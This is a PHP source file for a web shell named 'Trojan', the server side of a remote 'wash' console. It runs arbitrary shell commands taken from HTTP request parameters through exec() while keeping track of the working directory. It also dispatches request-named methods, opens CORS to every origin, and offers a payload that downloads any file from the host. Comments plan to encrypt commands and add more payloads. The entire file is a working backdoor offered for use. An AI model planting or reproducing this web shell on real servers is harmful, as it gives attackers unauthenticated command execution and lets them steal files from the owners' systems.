<?php

// @todo: probably need to track some kind of options hash over here
// @todo: it would be awesome to build a compatiblity layer for programs like 
// top that don't (I don't think) write to stdout
// @note @todo: all trojans should support some kind of "help" command to show
// you what payloads they're carrying
// @todo: it would be rad as hell if I could get tab-completion to work

class Trojan{
    private $command         = '';
    private $cwd             = '';
    private $payloads        = array();
    private $options         = array(
        'redirect_stderr_to_stdout'  => true,
    );
    private $output_raw      = array();
    private $response        = array(
        'error'          => '',
        'output'         => '',
        'prompt_context' => '',
    );

    /**
     * A generic constructor
     */
    public function __construct(){
        # emulate cwd persistence
        if(isset($_SESSION['cwd'])){
            $this->cwd = $_SESSION['cwd'];
        } else {
            $this->cwd = trim(`pwd`);
        }
        # require that a context always be set
        $this->response['prompt_context'] = $this->get_prompt_context();
    }

    /**
     * Processes commands sent from the wash client
     *
     * @param string $json             JSON from the wash client
     */
    public function process_command($json){
        # if the specified action was 'shell', pipe the command directly into
        # the web shell.
        if($json['action'] == 'shell'){
            $this->process_shell_command($json['cmd']);
        }

        # otherwise, simply invoke the method directly
        else {
            # metaprogramming FTW
            $method = $json['action'];

            # verify that the method exists before attempting to invoke it
            if(method_exists($this, $method)){
                $this->$method($json['args']);
            }
            # if the method doesn't exist, send back an error message
            else {
                $this->response = array(
                    # todo: implement error support within the wash console
                    'error'          => "wash error: the method $method is not supported by the trojan.",
                    'output'         => "wash error: the method $method is not supported by the trojan.",
                    'prompt_context' => $this->prompt_context,
                );
                $this->send_response();
            }
        }
    }

    /**
     * Processes a command from the wash client
     *
     * @param string $command          A command - this will change
     */
    private function process_shell_command($command){
        # buffer the command from the client, in case we ever want to refer
        # back to it
        $this->command = $command;

        /* @note: In order to get current directory persistence to work, I need 
         * to inject some `cd` and `pwd` commands around the command sent from 
         * the wash client. */

        # optionally (by default) redirect stderr to stdout
        if($this->options['redirect_stderr_to_stdout']){
            $command  = "cd {$this->cwd}; $command 2>&1; pwd";
        } else {
            $command  = "cd {$this->cwd}; $command; pwd";
        }
        exec($command, $this->output_raw);

        # buffer the results
        $this->cwd                        = array_pop($this->output_raw);
        $this->response = array(
            'output'         => join($this->output_raw, "\n"),
            'prompt_context' => $this->get_prompt_context(),
        );

        # save the cwd
        $_SESSION['cwd'] = $this->cwd;

        # send the response
        $this->send_response();
    }

    /**
     * Sends a response back to the wash client
     */
    private function send_response(){
        /* This header prevents the wash client from malfunctioning due to the 
         * Same-Origin Policy. @see: http://enable-cors.org/ */
        header('Access-Control-Allow-Origin: *');

        # configure the response to send
        $this->response = array(
            'prompt_context' => $this->response['prompt_context'],
            'output'         => $this->response['output'],
        );

        # assemble and send a JSON-encoded response
        echo json_encode($this->response);
        die();
    }

    /**
     * Assembles the prompt context to return to the wash client
     *
     * @return string $prompt_context  The prompt context
     */
    private function get_prompt_context(){
        // assemble the prompt context
        $whoami               =  trim(`whoami`);
        $hostname             =  gethostname();
        $line_terminator      =  ($whoami ===  'root') ? '#' : '$' ;
        $this->prompt_context =  "{$whoami}@{$hostname}:{$this->cwd}{$line_terminator}";
        return $this->prompt_context;
    }




    /*************************************************************************
     * Payload functions are from here downward
     *************************************************************************
    /**
     * Downloads a file
     *
     * @param string $args             Arguments passed from the wash client
     */
    public function payload_file_down($args){
        $file = $args['file'];
        chdir($this->cwd);
        # if the requested file exists, serve it up to the user
        if(file_exists($file)){
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename='.basename($file));
            header('Content-Transfer-Encoding: binary');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            readfile($file);
        }
        
        # if not, provide a notification
        else { echo "The requested file does not exist."; }
        die();
    }

    /**
     * Uploads files to the target server
     */
    public function payload_file_up($args){
        $out = json_encode($_FILES);
        $out = json_encode($_POST);

        # assemble a response
        $this->response = array(
            'output'         => $out,
            'prompt_context' => $this->prompt_context,
        );

        $this->send_response();
    }

    # fire mah layzor
    public function payload_laser($args){
        $args = join($args, "\n");

        # assemble a response
        $this->response = array(
            'output'         => 'Laser fired!!1' . $args,
            'prompt_context' => $this->prompt_context,
        );

        $this->send_response();
    }
}

/* ---------- Procedural code starts here ---------- */
# @todo (probably here: decrypt the command)
session_start();
$trojan = new Trojan();
$trojan->process_command($_REQUEST);
// I might want to move this up into one of the class methods
